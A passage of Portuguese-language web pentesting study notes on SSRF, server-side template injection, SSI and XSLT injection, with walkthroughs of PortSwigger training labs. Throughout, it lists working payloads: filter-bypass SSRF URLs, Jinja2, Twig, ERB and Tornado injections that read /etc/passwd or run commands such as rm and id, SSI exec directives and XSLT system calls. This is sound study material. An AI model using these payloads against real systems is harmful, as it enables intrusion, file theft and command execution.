        - **Lab 2: Basic SSRF against another back-end system** (APPRENTICE)
            
            ```php
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.
            ```
            
            Parametro vulneravel: `http://192.168.0.1:8080/admin`, entao fazemos IP enumeration com Fuzzing no valor `1`, depois encontramos a pagina admin e deletamos fazendo o mesmo procedimento do Lab 1.
            
            ---
            
        
        (Lab 3 apenas para versao Pro)
        
        - **Lab 4: Blind SSRF with out-of-band detection** (PRACTITIONER)
            
            ```php
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
            ```
            
            Precisamos deletar o username carlos do `http://localhost/admin`
            
            Porem nao conseguimos acessar essa URL, portanto precisamos fazer **bypass** de dois filtros, mudando o **`localhost`** para **`127.1`** e encodando o **`admin`** DUAS vezes:
            
            `http%3a%2f%2f127.1%2f%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
            
            E depois inserimos na URL o delete username (mesmo procedimento do Lab 1)
            
            ---
            
        - **Lab 5: SSRF with filter bypass via Open Redirection vulnerability** (PRACTITIONER)
            
            ```php
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. The stock checker has been restricted to only access the 
            local application, so you will need to find an open redirect affecting 
            the application first.
            ```
            
            Basicamente precisamos encontrar um Open Redirect (que acontece ao mudar de um produto para outro (botao: ”next product”), pois entao podemos entao inserir o LINK para o OPENREDIRECT (ja que o openredirect acontece na URL) DENTRO do SSRF encontrado, assim ele acaba passando pelos filtros ao estar primariamente acessando o proprio site (mas que com o open redirect acessamos o /admin e …)
            
            1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
            2. Try tampering with the `stockApi` parameter and observe that it isn't possible to make the server issue the request directly to a different host.
            3. Click "next product" and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection.
            4. Create a URL that exploits the open
            redirection vulnerability, and redirects to the admin interface, and
            feed this into sthe `stockApi` parameter on the stock checker: `/product/nextProduct?path=http://192.168.0.12:8080/admin`
            5. Observe that the stock checker follows the redirection and shows you the admin page.
            6. Amend the path to delete the target user: `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
            
            ---
            
        - **Lab 7: SSRF with whitelist-based input filter** (EXPERT)
            
            ```php
            
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed an anti-SSRF defense you will need to bypass.
            ```
            
            Caso queiramos acessar **`localhost/admin`**, e a whitelist precisa ter o **`stock.weliketoshop.net`**, podemos iniciar com localhost e usar **`#@`** para anular a URL necessaria (e o diretorio **`/admin`** vai no fim normalmente, apenas fica anluada o que esta antes da **`/`** ), caso nao de, podemos encodar a **`#`**, se nao der encodamos novamente (2encodes no **`#`**), ex:
            **`http://localhost:80%2523@stock.weliketoshop.net/admin`**
            
    
    ---
    
- **SSTI** (Server-Side Template Injection)
    
    [**https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html**](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
    
    OLHAR E ANALISAR PELO INSPECT!!! pois as vezes no burp nao percebemos a resposta JSON do servidor de algum parametro enviado (ex: [https://noxpengwin.com/htb-server-side-attacks/](https://noxpengwin.com/htb-server-side-attacks/)) E tambem porque apenas alterando no INSPECIONAR (botao direito - edit e resend) conseguimos ver a resposta no response do inspecionar (ele nao renderiza na pagina pois reatualiza)
    
    ---
    
    - **SSTI - Teoria e Exemplo** (Solyd)
        - Quando conseguimos injetar Template Tags que serão renderizadas por um Template Engine, assim conseguimos executar código dentro do servidor.
        
        ---
        
        - **Template  ⇒** Basicamente um texto composto por partes estáticas e partes dinâmicas.
        - Template Tag  ⇒ marcações especiais que representam as partes dinâmicas de um template.
        - Template Engine  ⇒ biblioteca ou ferramenta que substitui as tags pelos valores, gerando o conteúdo
        - Ex: `texto = “Oi, {{user.name}}”`
            - `Oi` é a parte estática e o `{{user.name}}` é a parte dinâmica que representa um Template Tag.
            
            ![aa.png](./images/aa-8.png)
            
            - Nesse caso, a idade está sendo passada pela URL, por causa disso podemos manipular ela, trocando por algo por ex: `?idade={{user.password}}`, já o nome não, ou seja não conseguimos injetar nada.
        
        ---
        
        1. No exemplo do site, dentro da página de profile existe a opção de alterar o nome de usuário, e quando alteramos ele atualiza a página com o respectivo nome na tela, isso significa que parte da página é dinâmica.
        2. Podemos então no campo de alterar o nome inserir: `blablabla{{4*4}}`, se o resultado final for atualizado para 16, signifca que deu certo a renderização, caso não, precisaremos procurar qual a Template Engine que está sendo utilizada.
        3. Nesse caso do exemplo damos um google em: **node js template engine express.** E ver como é a sintaxe de cada uma e ir testando 
        
        ---
        
        1. Após acharmos a Template Engine podemos inserir dentro do padrão de sintaxe dela: **#{require(”child_process”).exec(”whoami”)}**
            
            Podemos fazer shell reversa
            
    
    ---
    
    - **SSTI** (HackTheBox)
        - **Identifying**
            
            Basicamente tudo que reflete na pagina e que ou por teste ou por analise/deducao percebemos que eh uma Template Dinamica sendo renderizada (exemplo: nosso Nome sendo refletido, etc)
            
            PODE OCORRER tambem em strings refletidas em PDFs (exemplo: preenchemos um formulario que em seguida gera um PDF com nosso nome refletido que preenchemos, etc)
            
            E TAMBEM sempre observar relacoes de perfil, comentarios, etc (como no caso do Lab 2 do PortSwigger)
            
            ---
            
            Primeiro testamos a seguinte String:
            
            ```
            ${{<%[%'"}}%\.
            ```
            
            Se vulneravel a SSTI, talvez de erro (NEM SEMPRE! continuar os testes)
            
            Agora, para confirmarmos a vulnerabilidade e tambem identificarmos a linguagem, primeiro seguimos o Guia da imagem:
            
            ![**`{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2**](./images/image-14.png)
            
            **`{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2**
            
            Em MAIORIA funcionara, mas nem sempre, entao podemos seguir e usar esse guia para mais linguagens e testes (exemplos do Portswigger nao funciona por serem sempre outros Templates, e temos que testar varios):
            
            [**https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html**](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
            
            **OBS:** podemos tambem pelo Wappalyzer tlvz identificar a linguagem e identificar melhor e mais rpdo, ex: Node.js Express podemos pesquisar por Templates deles e ir testando (pub eh o mais usado nesse exemplo)..
            
            ---
            
        - **Exploiting**
            
            [**https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#exploits](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#exploits)    !!**
            
            [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
            
            ---
            
            (deletei todos os espacos dos comandos abaixo, pois estava fazendo dar erro e acho que todos eram irrelevantes, usar outros payloads (hacktricks) pra testar caso nao esteja funcionando)
            
            - **Jinja2**
                
                Primeiro podemos obter configuracoes da aplicacao web:
                
                ```
                {{config.items()}}
                ```
                
                (podem retornar credenciais etc)
                
                E tambem ver info sobre o codigo fonte da aplicacao web:
                
                ```
                {{self.__init__.__globals__.__builtins__}} 
                ```
                
                ---
                
                ### **Local File Inclusion (LFI)**
                
                Podemos usar a funcao **`open`** to Python para abrir arquivos:
                
                ```
                {{self.__init__.__globals__.__builtins__.open("/etc/passwd").read()}}
                ```
                
                ---
                
                ### **Remote Code Execution (RCE)**
                
                Podemos conseguir RCE usando a biblioteca **`os`** junto com **`system`** ou **`popen`**:
                
                ```
                {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
                ```
                
                ---
                
            - **Twig**
                
                Primeiro obtemos informacoes sobre o template:
                
                ```
                {{_self}}
                ```
                
                ---
                
                ### **Local File Inclusion (LFI)**
                
                ```
                {{"/etc/passwd"|file_excerpt(1,-1)}}
                ```
                
                ---
                
                ### **Remote Code Execution (RCE)**
                
                Funcao **`system com`** **`filter`**:
                
                ```
                {{['id']|filter('system')}}
                ```
                
                Para usar `ls ../` ou outros que tem o caracter espaco dentro (e estiver retornando erro), podemos encodar em URL (duas vezes se necessario)
                
        - **Tools**
            
            [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
            
    
    ---
    
    - **PortSwigger**
        - **Lab 1: Basic server-side template injection** (PRACTITIONER) (Template: Ruby **ERB**)
            
            ```
            This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template. To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the **morale.txt** file from Carlos's home directory.
            ```
            
            - Notice that when you try to view more details about the first product, a `GET` request uses the `message` parameter to render `"Unfortunately this product is out of stock"` on the home page.
            - In the ERB documentation, discover that the syntax `<%= someExpression %>` is used to evaluate an expression and render the result on the page.
            - Use ERB template syntax to create a test payload containing a mathematical operation, for example: `<%= 7*7 %>`
            - URL-encode this payload and insert it as the value of the `message` parameter in the URL as follows, remembering to replace `YOUR-LAB-ID` with your own lab ID: `https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>`
            - Load the URL in the browser. Notice that in
            place of the message, the result of your mathematical operation is
            rendered on the page, in this case, the number 49. This indicates that
            we may have a server-side template injection vulnerability.
            - From the Ruby documentation, discover the `system()` method, which can be used to execute arbitrary operating system commands.
            - Construct a payload to delete Carlos's file as follows: `<%= system("rm /home/carlos/morale.txt") %>`
        - **Lab 2: Basic server-side template injection (code context)** (PRACTITIONER) (Template: **Tornado** Python)
            
            ```php
            This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the 
            Tornado documentation to discover how to execute arbitrary code, then 
            delete the **morale.txt** file from Carlos's home directory.
            You can log in to your own account using the following credentials: **wiener:peter**
            ```
            
            Basicamente podefmos alterar o modo que queremos ser referenciados como username de perfil (name, last name, etc) e ao fazer isso, interceptando notamos que ele envia essa alteracao no Post como parametro de valor `user.name`, ou seja, ja eh um template, precisamos apensar fechar chaves e colocar o que quisermos, ex:
            
            `user.name}}{{7*7}}`
            
            Porem ao fazer isso nao aparece nada no nosso perfil, MAS ao observar produtos, notamos ao fazer um comentario, nosso nome no comentario eh dinamico, entao esse valor 49 foi renderizado la…
            
            1. While proxying traffic through Burp, log in and post a comment on one of the blog posts.
            2. Notice that on the "My account" page, you can
            select whether you want the site to use your full name, first name, or
            nickname. When you submit your choice, a `POST` request sets the value of the parameter `blog-post-author-display` to either `user.name`, `user.first_name`, or `user.nickname`. When you load the page containing your comment, the name above your
            comment is updated based on the current value of this parameter.
            3. In Burp, go to "Proxy" > "HTTP history" and find the request that sets this parameter, namely `POST /my-account/change-blog-post-author-display`, and send it to Burp Repeater.
            4. Study the Tornado documentation to discover
            that template expressions are surrounded with double curly braces, such
            as `{{someExpression}}`. In Burp Repeater, notice that you can escape out of the expression and inject arbitrary template syntax as follows: `blog-post-author-display=user.name}}{{7*7}}`
            5. Reload the page containing your test comment. Notice that the username now says `Peter Wiener49}}`, indicating that a server-side template injection vulnerability may exist in the code context.
            6. In the Tornado documentation, identify the syntax for executing arbitrary Python: `{% somePython %}`
            7. Study the Python documentation to discover that by importing the `os` module, you can use the `system()` method to execute arbitrary system commands.
            8. Combine this knowledge to construct a payload that deletes Carlos's file: `{% import os %}
            {{os.system('rm /home/carlos/morale.txt')`
            9. In Burp Repeater, go back to `POST /my-account/change-blog-post-author-display`. Break out of the expression, and inject your payload into the parameter, remembering to URL-encode it as follows: `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
            10. Reload the page containing your comment to execute the template and solve the lab.
        - **Lab 3: Server-side template injection using documentation** (PRACTITIONER)
            
            ```php
            This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation 
            to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r
            ```
            
            ---
            
        - **Lab 5: Server-side template injection with information disclosure via user-supplied objects** (PRACTITIONER) (Template: Django Python)
            
            ```bash
            This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This 
            vulnerability can be exploited to access sensitive data. To solve the lab, steal and submit the framework's secret key. You can log in to your own account using the following credentials:
            **content-manager:C0nt3ntM4n4g3r**
            ```
            
            **`{% debug %}`**
            
            **`{{settings.SECRET_KEY}}`**
            
            ---
            
            1. Log in and edit one of the product description templates.
            2. Change one of the template expressions to something invalid, such as a fuzz string `${{<%[%'"}}%\`, and save the template. The error message in the output hints that the Django framework is being used.
            3. Study the Django documentation and notice that the built-in template tag `debug` can be called to display debugging information.
            4. In the template, remove your invalid syntax and enter the following statement to invoke the `debug` built-in: `{% debug %}`
            5. Save the template. The output will contain a
            list of objects and properties to which you have access from within this template. Crucially, notice that you can access the `settings` object.
            6. Study the `settings` object in the Django documentation and notice that it contains a `SECRET_KEY` property, which has dangerous security implications if known to an attacker.
            7. In the template, remove the `{% debug %}` statement and enter the expression `{{settings.SECRET_KEY}}`
            8. Save the template to output the framework's secret key.
            9. Click the "Submit solution" button and submit the secret key to solve the lab.
            
            ---
            
        
    
    ---
    
- **SSI Injection** (Server-side Includes)
    
    É uma tecnologia usada para inserir conteúdo dinâmico em páginas HTML no lado do servidor, comum em servidores como **Apache** e **IIS**. A **SSI Injection** ocorre quando um atacante consegue injetar diretivas SSI maliciosas em arquivos HTML servidos pela aplicação, resultando na execução não autorizada de comandos no servidor.
    
    NORMALMENTE em extensões **`.shtml`**, **`.shtm`**, **`.stm`** (porém também pode aparecer em extensões html ou php normal..)
    
    Essa vulnerabilidade normalmente está ligada a:
    
    - Upload de arquivos que são **servidos diretamente pelo servidor**.
    - Campos de input que resultam em **criação de arquivos HTML ou TXT** no servidor.
    - **Feedbacks, mensagens, comentários** salvos e exibidos em páginas posteriores.
    
    ---
    
    ### IDENTIFICAÇÃO e EXPLORAÇÃO
    
    Podemos rodar o seguinte para testar se é vulnerável:
    
    | **Print variables** | **`<!--#printenv -->`** |
    | --- | --- |
    | Change config | `<!--#config errmsg="Error!" -->` |
    | Print specific variable | `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` |
    | Execute command | `<!--#exec cmd="whoami" -->` |
    | Include web file | `<!--#include virtual="index.html" -->` |
    
    ---
    
- **XSLT Injection** (eXtensible Stylesheet Language Transformation Injection)
    
    **XSLT** (eXtensible Stylesheet Language Transformations) é uma linguagem usada para **transformar arquivos XML** em outros formatos, como HTML, texto puro, ou outro XML. Permite **selecionar dados do XML** e **formatar** de maneira customizada.
    
    1. A aplicação recebe um **arquivo XML** (com dados brutos).
    2. Um **template XSLT** define **como exibir esses dados**.
    3. O servidor aplica esse template ao XML e **gera uma resposta formatada** (HTML ou texto, por exemplo).
    
    ---
    
    ### IDENTIFICAÇÃO
    
    - O app aceita `Content-Type: application/xml`
    - Sua requisição tem XML no corpo
    - A resposta contém `<?xml` ou é estruturada com tags XML
    
    ---
    
    ## **EXPLORAÇÃO**
    
    Enviar no POST (onde eh refletido com o valor dinamico) os payloads para Information Disclosure.
    
    **se for na url, ENCODAR EM URL!!**
    
    Version:
    
    **`<xsl:value-of select="system-property('xsl:version')" />`**
    
    Vendor:
    
    **`<xsl:value-of select="system-property('xsl:vendor')" />`**
    
    Vendor URL:
    
    **`<xsl:value-of select="system-property('xsl:vendor-url')" />`**
    
    Product Name:
    
    **`<xsl:value-of select="system-property('xsl:product-name')" />`**
    
    Product Version:
    
    **`<xsl:value-of select="system-property('xsl:product-version')" />`**
    
    ---
    
    ### **Local File Inclusion (LFI)**
    
    Depende da versao e library, entao testar varios os dois:
    
    **se for na url, ENCODAR EM URL!!**
    
    ```bash
    <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
    ```
    
    ```bash
    <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
    ```
    
    ### **Remote Code Execution (RCE)**
    
    **se for na url, ENCODAR EM URL!!**
    
    ```bash
    <xsl:value-of select="php:function('system','id')" />
    ```
    

---
